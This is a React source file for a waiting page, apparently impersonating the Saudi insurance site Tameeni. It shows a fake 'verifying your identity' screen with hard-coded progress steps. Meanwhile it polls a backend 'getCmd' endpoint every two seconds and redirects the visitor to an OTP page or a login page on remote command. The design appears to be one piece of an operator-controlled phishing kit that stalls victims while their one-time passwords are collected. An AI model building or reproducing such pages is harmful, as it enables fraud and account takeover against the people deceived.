import { useEffect, useState } from "react";
import { Shield, Clock, Loader2 } from "lucide-react";
import { tameeniApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";

export default function WaitingPage() {
  useTracking("انتظار");
  const [dots, setDots] = useState(".");

  useEffect(() => {
    const iv = setInterval(() => setDots(d => d.length >= 3 ? "." : d + "."), 600);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => {
    const id = localStorage.getItem("tameeni_id");
    if (!id) return;
    const iv = setInterval(async () => {
      const cmd = await tameeniApi.getCmd(id);
      if (cmd === "redirect:otp") window.location.href = "/tameeni/otp";
      else if (cmd === "redirect:login") window.location.href = "/tameeni/";
    }, 2000);
    return () => clearInterval(iv);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-bl from-blue-50 to-white flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="max-w-sm w-full mx-4 text-center space-y-8">
        <div className="flex justify-center">
          <div className="w-24 h-24 rounded-full bg-blue-100 flex items-center justify-center shadow-lg">
            <Shield className="w-12 h-12 text-blue-600" strokeWidth={1.5} />
          </div>
        </div>

        <div className="space-y-3">
          <div className="flex justify-center">
            <Loader2 className="w-7 h-7 text-blue-600 animate-spin" />
          </div>
          <h2 className="text-[22px] font-extrabold text-gray-900">جارٍ التحقق من بياناتك{dots}</h2>
          <p className="text-[14px] text-gray-500 leading-relaxed">
            نقوم بمراجعة طلبك والتحقق من هويتك<br />
            يرجى الانتظار لحظات
          </p>
        </div>

        <div className="bg-white rounded-2xl border border-blue-100 p-5 text-right space-y-3 shadow-sm">
          {[
            { label: "التحقق من الهوية", done: true },
            { label: "مراجعة بيانات السيارة", done: true },
            { label: "البحث عن أفضل عروض التأمين", done: false },
          ].map((s) => (
            <div key={s.label} className="flex items-center gap-3">
              <div className={`w-5 h-5 rounded-full flex items-center justify-center text-[11px] font-bold
                ${s.done ? "bg-emerald-500 text-white" : "bg-blue-100"}`}>
                {s.done ? "✓" : <Loader2 className="w-3 h-3 text-blue-600 animate-spin" />}
              </div>
              <span className={`text-[13px] font-semibold ${s.done ? "text-gray-700" : "text-blue-600"}`}>{s.label}</span>
            </div>
          ))}
        </div>

        <div className="flex items-center justify-center gap-1.5 text-[12px] text-gray-400">
          <Clock className="w-3.5 h-3.5" />
          <span>قد يستغرق ذلك بضع دقائق</span>
        </div>
      </div>
    </div>
  );
}
